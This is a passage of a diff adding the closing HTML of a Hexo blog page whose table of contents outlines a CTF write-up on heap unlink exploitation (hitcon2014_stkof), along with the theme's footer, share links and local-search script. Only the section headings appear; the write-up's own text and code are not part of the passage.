+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Unlink%EF%BC%9A"><span class="toc-text">Unlink：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#unlink%E4%BB%8B%E7%BB%8D%EF%BC%9A"><span class="toc-text">unlink介绍：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#unlink%E6%BA%90%E7%A0%81%EF%BC%9A"><span class="toc-text">unlink源码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unlink%E4%BD%BF%E7%94%A8%E4%B8%8Efree%EF%BC%9A"><span class="toc-text">unlink使用与free：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9Ahitcon2014-stkof"><span class="toc-text">例题：hitcon2014_stkof:</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E4%BF%9D%E6%8A%A4%EF%BC%9A"><span class="toc-text">检查保护：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-text">静态分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%BB%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-text">主函数：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#1%E3%80%81%E5%88%9B%E5%BB%BA%EF%BC%9A"><span class="toc-text">1、创建：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%E3%80%81%E4%BF%AE%E6%94%B9%EF%BC%9A"><span class="toc-text">2、修改：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3%E3%80%81%E5%88%A0%E9%99%A4%EF%BC%9A"><span class="toc-text">3、删除：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#4%E3%80%81%E6%89%93%E5%8D%B0-%E6%97%A0%E7%94%A8-%EF%BC%9A"><span class="toc-text">4、打印(无用)：</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-text">动态分析：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">思路总结：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unlink%E9%87%8D%E7%82%B9%EF%BC%9A"><span class="toc-text">Unlink重点：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E7%82%B9%EF%BC%9A"><span class="toc-text">注意点：</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#exp%EF%BC%9A"><span class="toc-text">exp：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#exp%E6%89%A7%E8%A1%8C%E6%95%88%E6%9E%9C%EF%BC%9A"><span class="toc-text">exp执行效果：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%EF%BC%9A"><span class="toc-text">远程：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%EF%BC%9A"><span class="toc-text">本地：</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zh-Closure">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">Copyright © 2023 Closure</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">email | 765003952@qq.com</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+      
+      
+          本站访客数<span id="busuanzi_value_site_uv"></span>人
+        
+      
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="可露希尔大涨价……">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Unlink + '&url=' + http%3A%2F%2Fexample.com%2F2022%2F03%2F01%2FUnlink%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2022/03/01/Unlink/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
